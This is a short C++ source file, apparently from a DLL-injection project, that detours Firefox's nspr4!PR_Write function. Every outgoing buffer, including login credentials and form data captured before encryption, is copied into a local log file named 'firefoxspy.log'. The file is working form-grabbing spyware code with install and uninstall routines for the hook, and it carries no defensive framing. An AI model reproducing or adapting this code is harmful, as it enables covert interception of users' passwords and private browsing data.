
//////////////////////////////////////////////
// (c) h4lf-jiffie (dohmatob elvis dopgima)
//     07/02/2012 Pessac - France
/////////////////////////////////////////////

#include "stdafx.h"

#define __PATCH_SIZE__ 0x6

PR_Write_t g_OriginalPR_Write; 

void Log(const char *buf)
{
	std::ofstream of;
	of.open("C:\\Users\\rude-boi\\CODE\\injektors\\spike\\firefoxspy.log", std::ios::out | std::ios::app);
	of << ">>>>>>>START OF BUFFER\r\n" << buf << "\r\nEND OF BUFFER<<<<<<<\r\n\r\n";
	of.close();
}

/////////////////////////////////////////////////////////////////////////////////////////
// This callback is invoked be PR_WriteDetour to sniff outgoing buffer and process it
////////////////////////////////////////////////////////////////////////////////////////
void Sniff(const char *buf, DWORD amount)
{
	Log(buf);
	// invoke other handles/plugins
}

//////////////////////////////////////////////////////////////////////////////
// This is the hook/sandbox with which we'll detour the nspr4!PR_Write API
/////////////////////////////////////////////////////////////////////////////
DWORD FakePR_Write(void *fd, const void *buf, DWORD amount)
{
	// invoke our pre-handler
	Sniff((const char *)buf, amount);

	// re-invoke PR_Write, this time in our 'sandbox'
	DWORD dwRetVal = g_OriginalPR_Write(fd, buf, amount);

	// invoke post-handler if any

	// finally
	return dwRetVal;
}	

////////////////////////////////////
// Detours the nspr4!PR_Write API 
///////////////////////////////////
void HookPR_Write(void)
{
	// obtain address of nspr4!PR_Write API
	if (!(g_OriginalPR_Write = (PR_Write_t)GetProcAddress(GetModuleHandleA("nspr4.dll"), "PR_Write")))
	{
		printf("[%s] Couldn't resolve nspr4!PR_Write.\n", __DLL_PSEUDO__);
		return;
	}

	// install detour
	InstallDetour((PVOID *)&g_OriginalPR_Write, (PVOID)FakePR_Write, __PATCH_SIZE__);
}

//////////////////////////////////////
// Undetours the nspr4!PR_Write API 
/////////////////////////////////////
void UnhookPR_Write(void)
{
	// uninstall detour
	UninstallDetour((PVOID *)&g_OriginalPR_Write);
}

		


